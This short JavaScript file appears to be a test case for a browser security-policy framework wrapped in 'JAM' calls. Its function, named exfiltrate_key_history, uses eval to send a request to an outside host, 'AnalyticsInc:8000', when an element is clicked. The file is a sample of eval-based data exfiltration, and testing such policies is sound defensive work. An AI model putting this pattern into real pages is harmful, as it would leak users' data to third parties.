// exfil_test_eval1.js
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval1", true);xmlhttp.send(null);';
  1;
  JAM.call(eval, null, [exp]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

